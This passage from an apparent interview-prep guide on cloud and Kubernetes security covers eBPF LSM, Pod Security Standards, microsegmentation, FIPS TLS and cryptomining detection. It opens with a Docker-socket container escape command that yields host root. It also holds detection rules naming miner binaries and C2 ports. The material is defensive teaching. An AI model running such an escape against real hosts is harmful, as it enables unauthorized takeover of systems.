# If /var/run/docker.sock is mounted in a container:
docker -H unix:///var/run/docker.sock run --privileged --pid=host \
  -v /:/host ubuntu chroot /host
# Full host root access via Docker API
```
**Mitigation:** Never mount Docker socket into containers. Use rootless Docker, Podman, or containerd without host socket exposure. Use Kaniko/Buildah for container builds in CI without Docker daemon.

**Additional defenses:**
- **Seccomp** — restrict syscalls available to the container. Kubernetes applies a default seccomp profile.
- **AppArmor/SELinux** — mandatory access control at the kernel level.
- **Rootless containers** — container processes run as non-root UID on the host.
- **gVisor (Google)** — kernel sandbox that interposes all syscalls via a user-space kernel (runsc). Even if the syscall layer is attacked, the host kernel is not exposed directly.
- **Kata Containers** — containers run in lightweight VMs (QEMU/VMware). True hardware isolation. Used by Azure for ACI, AWS for Fargate.

---

### Q63. What is eBPF LSM (Linux Security Module)? How does it differ from SELinux/AppArmor?

**LSM (Linux Security Module):** A framework providing hooks at security-sensitive points in the kernel (file open, socket connect, exec, etc.). SELinux, AppArmor, and Smack are traditional LSM implementations.

**eBPF LSM (CONFIG_BPF_LSM, kernel 5.7+):** Allows eBPF programs to be attached to LSM hooks. This enables writing custom security policies in C/Rust compiled to eBPF, rather than using SELinux policy language or AppArmor profiles.

**Comparison:**

| Dimension | SELinux | AppArmor | eBPF LSM |
|---|---|---|---|
| **Policy language** | Complex (Type Enforcement) | Simpler (path-based) | eBPF C (flexible, programmable) |
| **Runtime flexibility** | Policy update requires reload | Policy update requires reload | Dynamic — attach/detach programs without restart |
| **Observability** | AVC denials in audit log | Logs in syslog | Full BPF map access — custom metrics |
| **Expressive power** | Very high | Moderate | Very high (Turing-complete) |
| **Operational complexity** | Very high | Moderate | High (requires eBPF expertise) |
| **Android use** | Yes | No | Growing |

**eBPF LSM example (restrict network connections):**
```c
SEC("lsm/socket_connect")
int BPF_PROG(socket_connect, struct socket *sock, struct sockaddr *address, int addrlen) {
    // Deny connections to port 4444 (common C2 port)
    if (address->sa_family == AF_INET) {
        struct sockaddr_in *addr4 = (struct sockaddr_in *)address;
        if (bpf_ntohs(addr4->sin_port) == 4444)
            return -EPERM;
    }
    return 0;
}
```

**Tetragon** (Cilium security tool) uses eBPF LSM hooks to enforce and observe security policies at the kernel level with rich context.

---

### Q64. How does Kubernetes Pod Security Standards (PSS) work? Compare it to the deprecated PodSecurityPolicy.

**PodSecurityPolicy (PSP) — deprecated in 1.21, removed in 1.25:**
Admission controller that validated pods against security policies. Weaknesses: complex RBAC interaction (a PSP must be both created AND bound to a ServiceAccount via RBAC), hard to reason about which PSP applies to a pod, no dry-run/audit mode.

**Pod Security Standards (PSS) + Pod Security Admission (PSA) — GA in 1.25:**
Three built-in policy levels:
- **Privileged** — unrestricted (for system components like CNI).
- **Baseline** — prevents known privilege escalations. Blocks privileged containers, hostPID, hostNetwork, hostPorts, `CAP_NET_ADMIN`, seccomp Unconfined.
- **Restricted** — heavily restricted. Additionally blocks: running as root, privilege escalation, unsafe seccomp profiles, volumes (hostPath, etc.), non-approved capabilities.

**Enforcement via namespace labels:**
```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: payments
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: v1.28
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

**Three modes:**
- `enforce` — reject non-compliant pods.
- `audit` — allow but log to audit log.
- `warn` — allow but return warning to user.

**Use all three** during migration: `warn` + `audit` first, then `enforce` once violations are fixed.

**For fine-grained policy (beyond PSS):** Use OPA Gatekeeper or Kyverno (e.g., restrict specific images, require resource limits, enforce naming conventions).

---

### Q65. What is network microsegmentation? How do you implement it in a data center?

**Microsegmentation:** Dividing the data center network into small security zones — at the workload level (VM, container, or process) — and applying security policies to traffic between zones. Traditional segmentation uses VLANs/subnets (coarse); microsegmentation uses identity/labels.

**Traditional approach:** VLANs isolate groups (DMZ VLAN, DB VLAN). All VMs in the same VLAN can freely communicate. A compromised web server in the web VLAN can attack all other web servers.

**Microsegmentation approach:** Each VM/pod has an identity label. Policies say "payments-service can only talk to inventory-service on port 8080; nothing else." A compromised payments-service pod cannot laterally attack auth-service.

**Implementation options:**

1. **Kubernetes NetworkPolicy / Cilium:** For containerized workloads (described in Q27).

2. **VMware NSX-T:** For VM workloads in VMware vSphere. Distributed Firewall enforces policies at the vNIC level — even traffic between VMs on the same host segment.

3. **AWS SG per-ENI:** Each ENI has its own SG. SGs reference other SGs (not CIDRs) for identity-based rules.

4. **Calico Enterprise (for VMs):** Calico can be deployed to non-Kubernetes environments using felix + calico-cni or the Host Endpoints feature.

5. **Illumio, Guardicore:** Commercial microsegmentation platforms that discover workload communication, visualize it, and generate/enforce policies across mixed environments (bare-metal, VMs, containers, multi-cloud).

**Implementation steps:**
1. **Discover** — map existing communication flows (VPC Flow Logs, netflow, eBPF traces).
2. **Group** — define workload groups/labels (app=payments, env=prod, tier=backend).
3. **Policy design** — define allowed flows; default-deny everything else.
4. **Simulate** — run in audit/monitor mode; verify no legitimate traffic is blocked.
5. **Enforce** — enable blocking mode.
6. **Monitor** — continuously monitor for policy violations and new flows requiring policy updates.

---

### Q66. What is FIPS 140-2 / 140-3? How do you implement FIPS-compliant TLS in Go?

**FIPS 140-2/140-3:** Federal Information Processing Standard — NIST standard for cryptographic module validation. Required for US government systems and many regulated industries (finance, healthcare).

**Levels:**
- Level 1: Software-only, basic security requirements.
- Level 2: Physical tamper evidence + role-based auth.
- Level 3: Tamper resistance + identity-based auth.
- Level 4: Complete physical protection.

**FIPS-approved algorithms (140-2):**
- Symmetric: AES-128, AES-256 (approved), ChaCha20 (NOT approved).
- Hash: SHA-256, SHA-384, SHA-512 (approved), MD5, SHA-1 (deprecated).
- Asymmetric: RSA-2048+, ECDSA P-256/P-384 (approved), Ed25519 (NOT approved in 140-2).
- Key exchange: ECDH P-256/P-384 (approved), X25519 (NOT approved).

**Go FIPS-compliant TLS:**
Go has a `GOEXPERIMENT=boringcrypto` build tag that replaces Go's native crypto with BoringSSL (FIPS-validated):
```bash
# Build with BoringCrypto (FIPS)
GOEXPERIMENT=boringcrypto go build -o myapp .

# Verify FIPS mode
go tool nm myapp | grep fips
# Should show: crypto/internal/boring.init
```

**AWS FIPS endpoints:** AWS provides FIPS 140-2 compliant service endpoints:
- `s3-fips.us-east-1.amazonaws.com`
- `sts-fips.us-east-1.amazonaws.com`
Configure AWS SDK to use FIPS endpoints: `AWS_USE_FIPS_ENDPOINT=true`.

**TLS configuration (FIPS-compliant):**
```go
tlsConfig := &tls.Config{
    MinVersion: tls.VersionTLS12,
    CipherSuites: []uint16{
        // FIPS-approved cipher suites (no ChaCha20, no AES-CBC in newer guidance)
        tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
        tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
        tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
        tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
    },
    CurvePreferences: []tls.CurveID{
        tls.CurveP256, tls.CurveP384, // P-256 and P-384 (FIPS-approved)
        // NOT X25519 (not FIPS 140-2 approved)
    },
}
```

---

### Q67. What is network flow telemetry? Compare NetFlow, sFlow, and IPFIX.

**NetFlow (Cisco, RFC 3954):** Collects flow records (5/7/9 tuple) from routers/switches. A **flow** = all packets with same src-IP, dst-IP, src-port, dst-port, protocol. The device caches flows and exports records (UDP) to a collector when flows expire. **Sampling:** Can be 1:1 or sampled (1:1000 for high-traffic links). Provides: who talked to whom, how much, for how long.

**sFlow (RFC 3176):** Samples actual packet headers (every Nth packet) plus counter samples. More accurate than sampled NetFlow but provides less metadata per sample. Good for bandwidth accounting and anomaly detection.

**IPFIX (RFC 7011):** "IP Flow Information Export" — the IETF standardization of NetFlow v9. More flexible (extensible template-based format). Supported by open-source tools (nProbe, pmacct, Elastic/ECS). Increasingly preferred over proprietary NetFlow.

**Cloud equivalents:**
- **AWS VPC Flow Logs** — IPFIX-like but AWS-specific format. Captures ENI-level flows. Cannot capture all L7 fields.
- **GCP VPC Flow Logs** — similar; also exports to Cloud Logging and BigQuery.
- **Azure NSG Flow Logs** — per-NSG rule match records.

**Security use cases:**
- Network anomaly detection (port scanning, DDoS, unusual protocols).
- Forensic reconstruction of attack paths.
- Compliance (who accessed what network resource).
- Baselining normal behavior for ML-based detection.

---

### Q68. How does Kubernetes Service Account token projection and OIDC work?

**Legacy service account tokens:** Long-lived, not expiring, not audience-scoped JWT tokens stored in Secrets, mounted into pods. `GET /api/v1/namespaces/default/secrets` reveals all SA tokens. Security risk: tokens don't expire.

**Projected Service Account Tokens (PSAT, Kubernetes 1.12+):**
Time-limited, audience-scoped tokens generated on-the-fly and projected into the pod's filesystem:
```yaml
volumes:
- name: token
  projected:
    sources:
    - serviceAccountToken:
        audience: "https://vault.example.com"  # Audience scoping
        expirationSeconds: 3600                 # 1-hour TTL
        path: token
```

**OIDC integration (Kubernetes as OIDC provider):**
The Kubernetes API server can issue OIDC-compliant JWTs (signed with the cluster's private key). External systems (AWS, Vault, GCP) can validate these tokens by fetching the OIDC discovery document and JWKS:
```
https://<k8s-api-server>/.well-known/openid-configuration
https://<k8s-api-server>/openid/v1/jwks
```

**AWS EKS IRSA (IAM Roles for Service Accounts):**
1. EKS OIDC provider registered with AWS IAM.
2. Pod's PSAT token presented to AWS STS.
3. STS validates token against EKS OIDC provider.
4. STS issues temporary AWS credentials for the associated IAM role.
```bash
# Annotate SA with IAM role ARN
kubectl annotate serviceaccount my-sa \
  eks.amazonaws.com/role-arn=arn:aws:iam::123:role/my-role

# AWS SDK in pod automatically exchanges PSAT for STS credentials
# via $AWS_WEB_IDENTITY_TOKEN_FILE and $AWS_ROLE_ARN env vars
```

**Security advantages:** No static AWS credentials in pods. Credentials scoped to IAM role. Short-lived (1 hour). Auditable in CloudTrail.

---

### Q69. What is RBAC in AWS IAM vs. Kubernetes? How do you bridge them securely?

**AWS IAM RBAC:** Resource-level; policy-based. IAM Roles, Users, Groups with attached policies. Actions are AWS API calls. Principal assumptions via `sts:AssumeRole`. Conditions on MFA, source IP, time, tags.

**Kubernetes RBAC:** API-level; verb-resource-based. Roles/ClusterRoles with verbs (`get`, `list`, `create`, `delete`) on API groups/resources. Bindings connect subjects (Users/Groups/ServiceAccounts) to roles. No conditions (unlike AWS IAM).

**Bridging (EKS `aws-auth` ConfigMap / EKS Access Entries):**
Maps AWS IAM entities to Kubernetes RBAC subjects:
```yaml
# aws-auth ConfigMap (legacy)
apiVersion: v1
kind: ConfigMap
metadata:
  name: aws-auth
  namespace: kube-system
data:
  mapRoles: |
    - rolearn: arn:aws:iam::123:role/NodeInstanceRole
      username: system:node:{{EC2PrivateDNSName}}
      groups: [system:bootstrappers, system:nodes]
    - rolearn: arn:aws:iam::123:role/DevTeamRole
      username: dev-{{SessionName}}
      groups: [dev-readonly]
```

**EKS Access Entries (preferred, 2024+):**
```bash
aws eks create-access-entry --cluster-name my-cluster \
  --principal-arn arn:aws:iam::123:role/DevTeamRole \
  --type STANDARD

aws eks associate-access-policy --cluster-name my-cluster \
  --principal-arn arn:aws:iam::123:role/DevTeamRole \
  --policy-arn arn:aws:eks::aws:cluster-access-policy/AmazonEKSViewPolicy \
  --access-scope type=namespace,namespaces=["dev"]
```

**Security considerations:**
- Never grant `cluster-admin` to broad IAM roles. Use namespace-scoped access.
- Audit `aws-auth` ConfigMap or Access Entries — unauthorized changes grant cluster access.
- Use `kubectl auth can-i --as=arn:aws:iam::123:role/DevTeamRole --list` to verify effective permissions.
- Session tagging in STS: pass department/team tags through to Kubernetes username for fine-grained audit.

---

### Q70. What is Terraform infrastructure security scanning? Name tools and the most critical checks.

**Static IaC security scanning:** Analyze Terraform code before `apply` to detect misconfigurations.

**Tools:**
- **tfsec** (Aqua Security) — comprehensive Terraform checks, fast, CI-friendly.
- **Checkov** (Bridgecrew) — multi-IaC (Terraform, CloudFormation, K8s), policy-as-code with Rego.
- **Terrascan** (Tenable) — NIST/CIS policy checks.
- **Snyk IaC** — developer-friendly, integrated with SCM.
- **OPA Conftest** — custom Rego policies for any config format.

**Critical security checks:**

1. **S3 public access:** `aws_s3_bucket` with `acl = "public-read"` or missing `aws_s3_bucket_public_access_block`.
2. **SG unrestricted ingress:** `cidr_blocks = ["0.0.0.0/0"]` on ports 22, 3389, 3306, 5432.
3. **RDS publicly accessible:** `publicly_accessible = true`.
4. **Unencrypted storage:** RDS `storage_encrypted = false`, EBS `encrypted = false`, S3 SSE not configured.
5. **IMDSv1 enabled:** EC2 `metadata_options.http_tokens != "required"`.
6. **Missing CloudTrail:** No `aws_cloudtrail` resource or `include_global_service_events = false`.
7. **IAM wildcard:** `Resource = "*"` with `Action = "*"`.
8. **KMS key no rotation:** `enable_key_rotation = false`.
9. **EKS cluster public endpoint:** `endpoint_public_access = true` without IP restrictions.
10. **Lambda function URL:** `authorization_type = "NONE"` — unauthenticated public access.

```bash
# Run tfsec on Terraform code
tfsec . --format json | jq '.results[] | select(.severity == "CRITICAL")'

# Conftest with custom policies
conftest test main.tf --policy ./policies/

# In CI pipeline (GitHub Actions)
- name: Security scan
  run: |
    tfsec . --soft-fail
    checkov -d . --framework terraform --check CKV_AWS_*
```

---

### Q71. Explain how Calico's eBPF datapath works vs. its iptables datapath.

**Calico iptables datapath:** Calico's Felix agent programs iptables rules for NetworkPolicy enforcement and routing. For each pod-to-pod connection, traffic traverses the iptables filter table (O(n) rule evaluation). kube-proxy handles Service DNAT (also via iptables). At scale (thousands of pods/services), iptables rule counts are large; rule updates cause brief inconsistency windows.

**Calico eBPF datapath:**
- Felix programs eBPF maps (O(1) lookup) instead of iptables rules.
- eBPF programs attached at the tc ingress/egress hooks on each pod veth interface.
- kube-proxy replaced by Calico's eBPF-native Service load balancing.
- **DSR (Direct Server Return):** In eBPF mode, Calico can use DSR for services — the backend pod sends the response directly to the client (with the source IP of the NodePort/LB), bypassing the node where the connection was received. Reduces latency and halves network hops.
- **XDP for host protection:** Calico uses XDP at the host network interface for high-speed packet filtering.

**Enabling Calico eBPF:**
```bash
kubectl patch installation.operator.tigera.io default --type=merge \
  -p '{"spec": {"calicoNetwork": {"linuxDataplane": "BPF"}}}'

# Disable kube-proxy (Calico eBPF replaces it)
kubectl patch ds -n kube-system kube-proxy \
  -p '{"spec":{"template":{"spec":{"nodeSelector":{"non-existing":"true"}}}}}'
```

**Performance:** At 10k services, Calico eBPF shows 2-3x better throughput and ~50% lower latency for service traffic vs. iptables mode.

---

### Q72. What is network chaos engineering? How do you test network resilience in production?

**Network chaos engineering:** Deliberately injecting network faults to test system resilience — packet loss, latency, jitter, bandwidth limits, connection drops, DNS failures.

**Tools:**

**tc (traffic control) netem — kernel-level:**
```bash
# Add 100ms latency + 10% packet loss on eth0
tc qdisc add dev eth0 root netem delay 100ms loss 10%

# Add latency with jitter (100ms ± 20ms)
tc qdisc add dev eth0 root netem delay 100ms 20ms distribution normal

# Simulate bandwidth limit (1 Mbit/s)
tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms

# Remove
tc qdisc del dev eth0 root
```

**Chaos Mesh (CNCF):** Kubernetes-native chaos engineering:
```yaml
apiVersion: chaos-mesh.org/v1alpha1
kind: NetworkChaos
metadata:
  name: payment-network-delay
spec:
  action: delay
  mode: one
  selector:
    namespaces: [payments]
    labelSelectors:
      app: payments-api
  delay:
    latency: 200ms
    jitter: 50ms
    correlation: "25"  # 25% correlation between successive delays
  duration: 10m
```

**Chaos Monkey / Gremlin / AWS Fault Injection Simulator (FIS):** Managed chaos for cloud environments.

**What to test:**
1. Service degradation during dependency latency (circuit breakers firing correctly).
2. DNS failure handling (retries, fallback).
3. NLB health check failure causing re-routing.
4. Partition (pod ↔ etcd) — does the cluster remain stable?
5. AZ failure — traffic fails over to healthy AZ.
6. Certificate expiry simulation — cert rotation under load.

**Runbook:** Always have a clear rollback (remove tc qdisc, delete NetworkChaos CR), define blast radius (test in staging or canary, not all prod pods), monitor SLIs (error rate, latency P99) during experiments.

---

### Q73. How do you implement network security for a multi-tenant Kubernetes cluster?

**Multi-tenancy models in Kubernetes:**
1. **Soft multi-tenancy** — multiple teams on shared cluster with RBAC + NetworkPolicy isolation.
2. **Hard multi-tenancy** — each tenant gets dedicated cluster (strongest isolation).
3. **Virtual cluster (vCluster)** — each tenant gets a virtual Kubernetes control plane within a namespace.

**Soft multi-tenancy network security controls:**

**1. Namespace isolation with default-deny:**
```yaml
# Per-namespace default deny (applied to all tenant namespaces)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: tenant-a
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
```

**2. Namespace-to-namespace isolation:**
```yaml
# Only allow tenant-a pods to reach their own namespace and shared-services
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-same-namespace
  namespace: tenant-a
spec:
  podSelector: {}
  ingress:
  - from:
    - podSelector: {}  # Same namespace only
  - from:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: shared-services
```

**3. Cilium ClusterMesh Network Policies for cross-cluster tenant isolation.**

**4. Hierarchical namespace controller (HNC):** Propagate NetworkPolicies from parent namespaces to child namespaces.

**5. ResourceQuota for network resources:**
```yaml
# Limit number of LoadBalancer Services (cost control + blast radius)
apiVersion: v1
kind: ResourceQuota
metadata:
  name: tenant-network-quota
  namespace: tenant-a
spec:
  hard:
    services.loadbalancers: "2"
    services.nodeports: "0"
```

**6. Admission control (Gatekeeper/Kyverno):** Prevent tenants from creating privileged pods (hostNetwork, hostPort) that could bypass network isolation.

**7. Node isolation (node selector + taints):** Assign tenant workloads to dedicated node groups — prevents shared-memory side channels (Spectre/Meltdown) between tenants:
```yaml
nodeSelector:
  tenant: tenant-a
tolerations:
- key: tenant
  value: tenant-a
  effect: NoSchedule
```

**Hard multi-tenancy considerations:** For tenants with strict isolation requirements (financial, healthcare, SLA guarantees), dedicated clusters are the only production-proven approach. Shared Kubernetes control planes have had security issues (RBAC bypasses, admission controller bypasses).

---

### Q74. What is the OSI model? How do attacks map across layers?

**OSI model and attack mapping:**

| Layer | Name | Protocol examples | Attack examples |
|---|---|---|---|
| 7 | Application | HTTP, DNS, SMTP, gRPC | SQL injection, XSS, API abuse, SSRF, XXE, deserialization |
| 6 | Presentation | TLS, SSL, encoding | SSL stripping, downgrade attacks, encoding attacks |
| 5 | Session | TLS handshake, gRPC streams | Session hijacking, session fixation |
| 4 | Transport | TCP, UDP, QUIC | SYN flood, UDP flood, port scanning, MITM (via ARP then TCP injection) |
| 3 | Network | IP, ICMP, BGP, OSPF | IP spoofing, BGP hijacking, route injection, ICMP flood, TTL manipulation |
| 2 | Data Link | Ethernet, ARP, VLAN, MPLS | ARP poisoning, MAC flooding, VLAN hopping, 802.1Q double-tagging |
| 1 | Physical | Fiber, copper, wireless | Wiretapping, jamming, hardware implants |

**Defense mapping:**
- L7: WAF, input validation, application firewall, API gateway.
- L4: SYN cookies, connection rate limiting, stateful firewall.
- L3: RPKI, uRPF (unicast Reverse Path Forwarding) to block spoofed sources.
- L2: Dynamic ARP Inspection, port security, 802.1X.
- L1: Physical access controls, tamper-evident hardware.

**uRPF (RFC 3704):** Anti-spoofing technique at L3. Router checks that the source IP of an incoming packet is reachable via the interface it arrived on. If a packet claims to be from `1.2.3.4` but arrives on an interface where `1.2.3.4` is not in the routing table for that interface, it's dropped. Prevents source IP spoofing in DDoS attacks.

---

### Q75. How does HTTP/2 and gRPC networking work? What are the security considerations?

**HTTP/2 (RFC 7540):** Binary multiplexed protocol over TLS. Multiple streams over a single TCP connection. Header compression (HPACK). Server push (deprecated usage). Priority streams.

**gRPC:** Remote procedure call framework built on HTTP/2. Protobuf for serialization. Unary, server streaming, client streaming, bidirectional streaming call types.

**Security considerations:**

1. **Stream multiplexing and DoS:** HTTP/2 `SETTINGS_MAX_CONCURRENT_STREAMS` controls stream limit. CVE-2023-44487 (HTTP/2 Rapid Reset attack): sending massive RST_STREAM frames can exhaust server resources. **Mitigation:** Update HTTP/2 libraries; rate-limit RST_STREAM; connection-level circuit breakers.

2. **Header injection:** HPACK dynamic table compression — header injection attacks if untrusted data included in headers. Always sanitize gRPC metadata.

3. **gRPC reflection:** The gRPC Server Reflection API allows clients to discover available services and their proto definitions. **Disable in production** unless intentionally needed:
   ```go
   // DON'T do this in production (exposes all service definitions)
   // reflection.Register(grpcServer)
   ```

4. **Unary vs. streaming auth:** Unary gRPC calls are straightforward (per-call auth). For streaming calls, authentication happens at stream establishment — authorize on `StreamInterceptor`, but re-authorize for long-lived streams if auth tokens expire within the stream lifetime.

5. **gRPC TLS:** Always require TLS (`grpc.WithTransportCredentials` — never `grpc.WithInsecure()` in production):
   ```go
   creds, _ := credentials.NewClientTLSFromFile("ca.crt", "")
   conn, _ := grpc.Dial("server:443", grpc.WithTransportCredentials(creds))
   ```

6. **HTTP/2 to HTTP/1.1 downgrade:** Some proxies (older AWS ALB, some WAFs) downgrade HTTP/2 to HTTP/1.1. Ensure security controls are consistent across protocol versions.

---

### Q76. What is container image security scanning? How do you integrate it in a CI/CD pipeline?

**Image scanning:** Analyzing container images for known CVEs in OS packages and language dependencies. Two approaches:
- **Static scanning** — scan the image layers (filesystems) against vulnerability databases (NVD, OSV, GitHub Advisory).
- **Runtime scanning** — monitor running containers for exploited vulnerabilities.

**Tools:**
- **Trivy (Aqua):** Fast, comprehensive. Scans OS packages (apt, rpm), language packages (npm, pip, go modules), IaC, SBOMs. Open-source.
- **Grype (Anchore):** Similar to Trivy. Good for SBOM-driven scanning.
- **Snyk:** Developer-focused, integrates with IDEs and SCM. Commercial.
- **ECR/GCR native scanning:** AWS ECR Enhanced Scanning (Snyk-powered), GCR Artifact Registry scanning.

**CI/CD integration (GitHub Actions + Trivy):**
```yaml
- name: Scan container image
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: 'ghcr.io/myorg/myapp:${{ github.sha }}'
    format: 'sarif'
    severity: 'CRITICAL,HIGH'
    exit-code: '1'  # Fail CI on CRITICAL vulnerabilities
    ignore-unfixed: true  # Don't fail on unfixed vulns (no patch available)
  
- name: Upload scan results to GitHub Security
  uses: github/codeql-action/upload-sarif@v2
  with:
    sarif_file: 'trivy-results.sarif'
```

**Policy enforcement at admission (Kyverno):**
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: block-unscanned-images
spec:
  rules:
  - name: check-image-vulnerability-report
    match:
      resources:
        kinds: [Pod]
    verifyImages:
    - imageReferences: ["*"]
      required: true
      attestors:
      - entries:
        - keyless:
            subject: "https://github.com/myorg/*"
```

**Distroless images:** Use Google distroless base images (`gcr.io/distroless/static`) — contain only the application runtime, no shell, no package manager. Dramatically reduces attack surface and CVE count.

---

### Q77. Explain AWS Network Firewall. How does it differ from Security Groups?

**AWS Network Firewall:** A managed, stateful NGFW deployed into a VPC subnet. Provides:
- **Stateful inspection** — Suricata-compatible rules, application protocol detection.
- **Stateless rules** — evaluated first, based on 5-tuple + byte ranges.
- **Domain-based filtering** — block/allow by FQDN (uses SNI, not TLS decryption).
- **IPS (Intrusion Prevention)** — Suricata-based signatures.
- **Managed rule groups** — AWS-managed threat intelligence rules.

**Architecture pattern (centralized inspection):**
```
Internet → IGW → Firewall Endpoint (in firewall subnet)
                → Firewall inspects + allows/drops
                → Application subnet (app lives here)
```
Routing: IGW route table routes traffic to Firewall Endpoint; Firewall route table routes allowed traffic to App subnet.

**Difference from Security Groups:**

| Dimension | Security Group | AWS Network Firewall |
|---|---|---|
| **Layer** | L4 (stateful) | L3-L7 (stateful + stateless) |
| **Scope** | ENI level | VPC subnet level (dedicated subnet) |
| **Rules** | Allow only, IP/port/SG reference | Stateless + stateful + Suricata IPS |
| **FQDNs** | No domain filtering | Yes (SNI-based, no decryption) |
| **IPS signatures** | No | Yes (Suricata rules) |
| **Logging** | VPC Flow Logs | Alert, Flow, TLS logs |
| **Cost** | No additional cost | Per-endpoint + per-GB |
| **Deployment** | Automatic (attached to ENI) | Manual routing configuration |

**Use cases for Network Firewall:**
- Centralized egress filtering (block all except allowed domains).
- East-West inspection (inter-VPC traffic through TGW + inspection VPC).
- IPS for inbound traffic (combined with WAF for L7).
- Compliance-required network-layer logging.

---

### Q78. What is Kube-proxy and how does it implement Kubernetes Services?

**kube-proxy:** A Kubernetes component running as a DaemonSet on each node. Implements the Kubernetes Service abstraction by programming the node's network to route traffic to the correct backend pods.

**Three modes:**

**1. userspace mode (legacy):** kube-proxy opens a proxy port per Service; packets redirected from iptables to kube-proxy process. Very slow (kernel → userspace → kernel), not used anymore.

**2. iptables mode (default):** kube-proxy programs iptables rules for each Service and Endpoint. Uses `statistic` module for probabilistic load balancing:
```bash
# View kube-proxy iptables rules
iptables-save | grep KUBE-SVC

# Example: ClusterIP 10.96.10.100:80 → 3 pods
-A KUBE-SVC-XYZ -m statistic --mode random --probability 0.33 -j KUBE-SEP-POD1
-A KUBE-SVC-XYZ -m statistic --mode random --probability 0.50 -j KUBE-SEP-POD2
-A KUBE-SVC-XYZ -j KUBE-SEP-POD3
# Each KUBE-SEP-* rule does DNAT to the pod IP:port
```

**3. IPVS mode:** Uses Linux IPVS (IP Virtual Server) — a kernel-level L4 load balancer. Hash tables vs. iptables linear rules. Supports multiple load balancing algorithms (rr, lc, sh, dh, sed, nq). Better performance at scale (1000+ services).
```bash
# Enable IPVS mode
kubectl edit configmap kube-proxy -n kube-system
# Set mode: ipvs

# View IPVS rules
ipvsadm -Ln
```

**Session affinity:** `service.spec.sessionAffinity: ClientIP` — kube-proxy uses iptables `recent` module or IPVS persistence to pin connections from the same client IP to the same pod.

**NodePort SNAT:** By default (`externalTrafficPolicy: Cluster`), kube-proxy SNATs NodePort traffic (source IP becomes node IP), enabling any node to forward to any pod. Loses client IP. `externalTrafficPolicy: Local` preserves source IP but only routes to pods on the local node.

---

### Q79. How do you detect and prevent cryptomining attacks in Kubernetes?

**Cryptomining attack pattern:**
1. Exploit vulnerability in a web app (RCE, command injection).
2. Download and run a miner (xmrig, etc.) inside the container.
3. Consume CPU/GPU resources; generate noise in billing.

**Detection signals:**

1. **High CPU sustained usage** — cryptomining causes near-100% CPU utilization sustained over hours. Set CPU limits on all containers; alert on throttling rate exceeding threshold.
   ```yaml
   resources:
     limits:
       cpu: "500m"
     requests:
       cpu: "100m"
   ```

2. **Unusual network connections** — miners connect to mining pools (TCP ports 3333, 4444, 5555, 7777, 14444; Stratum protocol). Use Cilium DNS proxy to block mining pool domains; use NetworkPolicy to restrict egress to known-good endpoints only.

3. **eBPF process execution monitoring (Tetragon):**
   ```yaml
   # Tetragon TracingPolicy — alert on suspicious binary execution
   apiVersion: cilium.io/v1alpha1
   kind: TracingPolicy
   spec:
     kprobes:
     - call: "sys_execve"
       syscall: true
       args:
       - index: 0
         type: string
       selectors:
       - matchBinaries:
         - operator: In
           values: ["/tmp/xmrig", "/tmp/miner", "/dev/shm/"]
         matchActions:
         - action: Sigkill  # Kill the process immediately
   ```

4. **Falco rules:**
   ```yaml
   - rule: Detect cryptomining
     desc: Detect execution of crypto miners
     condition: spawned_process and proc.name in (xmrig, ethminer, cgminer, bfgminer)
     output: "Cryptominer executed (user=%user.name container=%container.name)"
     priority: CRITICAL
   ```

5. **Runtime image scanning** — detect if a known miner binary exists in the container filesystem.

**Prevention:**
- No-exec on `/tmp`, `/dev/shm` mount points (`noexec` mount option).
- Immutable container filesystems (`readOnlyRootFilesystem: true`).
- No internet egress by default (default-deny NetworkPolicy + egress whitelist).
- Admission control blocking images with known miners or from unverified registries.

---

### Q80. What is mutual attestation between cloud workloads? How does it work with TPM?

**Attestation:** The process of cryptographically proving properties of a system or process — what software is running, that it hasn't been tampered with, on what hardware.

**TPM (Trusted Platform Module, TPM 2.0):** A tamper-resistant cryptographic chip (or firmware equivalent — fTPM) on modern hardware. Capabilities:
- **PCR (Platform Configuration Registers)** — 24 registers, each 256-bit (SHA-256). Extended with measurements (hash of firmware, bootloader, kernel, initrd) during boot. PCR values represent the boot chain state.
- **Quote operation** — signs current PCR values with the TPM's Attestation Key (AK), proving boot chain integrity to a remote verifier.
- **Sealed secrets** — secrets sealed to specific PCR values; can only be unsealed if PCRs match (i.e., boot chain hasn't changed).

**Remote attestation flow:**
```
Attestation Server (Verifier)          Workload (Prover, has TPM)
1. ← Request attestation
2.    Generate TPM Quote (PCR values + nonce, signed by AK) →
3.    Send AIK certificate (AK's identity certified by manufacturer) →
4. Verify AIK cert chain (AMD/Intel/manufacturer CA)
5. Verify Quote signature (AK signed it)
6. Verify PCR values match golden values (expected boot chain)
7. Issue access token (SVID, service credential) →
```

**SPIRE TPM attestor:**
SPIRE agent uses the TPM to attest the node's identity. The SPIRE server verifies the TPM quote and issues an SVID only if the boot chain measurements match the registered expected values.

**Cloud attestation:**
- **AWS Nitro Attestation:** Nitro-enclave generates a signed attestation document containing PCR measurements and a nonce. Verifiable by AWS KMS, which can require a valid Nitro attestation before decrypting a KMS key.
- **GCP Confidential VMs:** AMD SEV attestation — proves VM memory is encrypted and the image hash.
- **Azure Confidential VMs:** AMD SEV-SNP or Intel TDX attestation via MAA (Microsoft Azure Attestation).

---

### Q81. How does east-west traffic inspection work in a cloud environment?

**East-West traffic:** Traffic between services within the same VPC/cluster (as opposed to north-south = ingress/egress to the internet).

**Why it matters:** Attackers who breach perimeter defenses can move laterally via unmonitored east-west paths. Traditional firewalls focus on north-south.

**Implementation architectures:**

**1. Service Mesh mTLS + L7 policy (Istio/Cilium):**
All service-to-service traffic is inspected by Envoy/eBPF proxies. AuthorizationPolicy controls which services can communicate. Full L7 visibility (HTTP method, path, status code) without inline NGFW.

**2. Centralized network firewall (hub-spoke):**
